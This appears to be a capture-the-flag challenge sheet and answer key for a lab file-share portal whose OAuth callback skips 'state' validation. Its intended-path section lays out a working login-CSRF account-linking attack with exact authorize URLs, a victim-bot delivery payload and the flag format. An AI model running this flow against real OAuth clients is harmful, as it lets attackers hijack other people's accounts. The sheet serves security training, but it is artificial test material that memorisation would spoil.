# oauth/missing-state — MissingState (identity-gated, high)

**CloudVault** file-share portal + embedded AS (`VaultID`). Accounts can link a social SSO identity.
**Bug:** the client callback `/oauth/callback` never validates `state` (login CSRF). It exchanges whatever `code` it receives and links that social identity to the **currently signed-in** account.

## Intended path
1. Register your own social identity (`POST /social/register`, auto AS sign-in) and sign in at the client as `0xnhsec` / `vlh-tester-01` to see the legit linking flow (`/app` → Link SSO identity).
2. Get a code for YOUR identity: open `/oauth/authorize?client_id=web&redirect_uri=http%3A%2F%2Fvictim.target.lab%3A8119%2Foauth%2Fcallback&response_type=code&scope=read&state=x` while signed in at the AS — read the `code` from the `Location` header (do **not** visit the callback yourself: the code is single-use).
3. Deliver the callback to the victim: `POST http://collector.target.lab:8119/victim` with
   `{"url":"http://victim.target.lab:8119/oauth/callback?code=<your code>","sso":true}` — the bot holds the innocent's **client** session, so YOUR social identity gets linked to the innocent's account.
4. `curl http://victim.target.lab:8119/flag` — gate: `linked_identities` must contain a row linking the innocent account to a social sub that is not its own (server-side DB check).

**Flag:** `DSLTV{OAUTH-MissingState-<9 digits>}` (only from `/flag`).
